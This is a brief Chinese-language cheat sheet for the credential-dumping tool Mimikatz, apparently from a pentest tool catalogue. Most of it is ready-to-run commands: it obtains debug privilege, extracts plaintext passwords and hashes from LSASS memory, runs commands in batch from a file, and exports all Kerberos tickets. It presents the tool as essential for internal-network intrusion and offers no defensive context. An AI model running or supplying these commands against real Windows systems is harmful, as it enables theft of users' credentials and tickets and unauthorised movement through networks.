### Mimikatz

| 属性 | 值 |
|------|-----|
| 版本 | 2.2.0 |
| 平台 | Windows |
| 风险 | 🔴 高 |
| 标签 | `凭据窃取` `内存提取` `票据` |

## Mimikatz 常用命令执行

### 交互式执行提取明文密码
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### 批量执行文件中的命令并保存结果
```bash
mimikatz.exe < mimikatz_commands.txt > output.txt
```

### 导出内存中的所有 Kerberos 票据
```bash
mimikatz # sekurlsa::tickets /export
```

- ✓ 从 LSASS 内存提取明文密码和 Hash
- ✓ 支持 Kerberos 票据导入导出
- 内网渗透必备核心工具
